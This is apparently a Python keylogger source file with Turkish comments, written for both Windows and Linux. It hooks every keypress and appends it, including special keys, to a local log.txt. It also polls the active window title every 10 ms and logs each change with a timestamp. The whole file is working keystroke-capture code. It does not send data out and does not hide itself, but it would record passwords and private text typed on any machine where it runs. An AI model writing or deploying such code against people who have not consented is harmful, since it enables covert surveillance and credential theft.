#KÜTÜPHANELER
# {
import datetime # Tarih kütüphanesi
import win32gui # Windows
import Xlib.display # Linux
import keyboard # Klavyeden girilen inputları çekiyor
import os # işletim sisteminin belirlenmesi
import time # Zaman kütüphanesi
# }

isletimSistemi = os.name
Tarih = datetime.datetime.now() # Tarih değikeni zaman değişkenini tutuyor
enSonBaslik = "" # Bu değişken En son açılan pencereyi tutuyor

# Aktif pencereler için fonksiyon 
# {
def aktifPencereLinux():
    display = Xlib.display.Display()
    root = display.screen().root

    window_id = root.get_full_property(display.intern_atom('_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
    window = display.create_resource_object('window', window_id)

    window_name = window.get_full_property(display.intern_atom('_NET_WM_NAME'), 0).value
    window_name = window_name.decode() if isinstance(window_name, bytes) else window_name

    display.close()
    return window_name

def aktifPencereWindows(): 
    return win32gui.GetWindowText(win32gui.GetForegroundWindow()) # Açılan pencerenin adını döndürür
# }

# Bu tuşlar için farklı bir yöntem uyguladım 
# {
tusWindows = [
  "tab","esc","right windows","left windows","ctrl","alt","alt gr","right shift", "shift", 
  "right ctrl","backspace","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
  "delete","homepage","insert","print screen","num lock","page down","page up","end","up","down","right","left"
]

tusLinux = [
    "tab", "esc", "meta", "left meta", "right meta", "control", "alt", "alt gr", "right shift", "shift",
    "right ctrl", "backspace", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10",
    "f11", "f12", "delete", "home", "insert", "print", "num lock", "page down", "page up", "end",
    "up", "down", "right", "left"
]
# }

# Klavyeden girilen inputları yakalayan fonksiyon 
# {
def on_key_press(event):
  global tus
  if isletimSistemi == "nt":
    tus = tusWindows
    
  else:
    tus = tusLinux
  
  if event.name in tus:
    with open("log.txt", "a", encoding="utf8") as dosya:
      dosya.write(f"<{event.name}>")
    print(f"<{event.name}>")
      
  elif event.name == "space":
    with open("log.txt", "a", encoding="utf8") as dosya:
      dosya.write(" ") 
    print(" ")
  
  elif event.name == "caps lock":
    pass

  elif event.name == "enter":
    print('\n')
      
  else:
        with open("log.txt", "a", encoding="utf8") as dosya:
            dosya.write(event.name)
        print(event.name, end="") 
# }
   
with open("log.txt", "a", encoding='utf-8') as dosya: 
  dosya.write(f"Program {Tarih.strftime('%d.%m.%Y %H:%M:%S')} başladı.\n") 

keyboard.on_press(on_key_press)

# Pencereler yakalanıyor 
# {
if isletimSistemi == "nt":
  ozelTuslar = tusWindows
  
  while True: 
    time.sleep(0.01) 
    Baslik = aktifPencereWindows()
    
    if Baslik != enSonBaslik: 
          print(f"[{Tarih.strftime('%d.%m.%Y %H:%M:%S')}] {Baslik}\n")
          enSonBaslik = Baslik 

          with open("log.txt", "a", encoding='utf-8') as dosya: 
            dosya.write (f"[{Tarih.strftime('%d.%m.%Y %H:%M:%S')}] {Baslik}\n") 

else:
  ozelTuslar = tusLinux
  
  while True: 
    time.sleep(0.01) 
    Baslik = aktifPencereLinux() 
    
    if Baslik != enSonBaslik: 
          print(f"[{Tarih.strftime('%d.%m.%Y %H:%M:%S')}] {Baslik}\n") 
          enSonBaslik = Baslik 

          with open("log.txt", "a", encoding='utf-8') as dosya: 
            dosya.write (f"[{Tarih.strftime('%d.%m.%Y %H:%M:%S')}] {Baslik}\n") 
# }
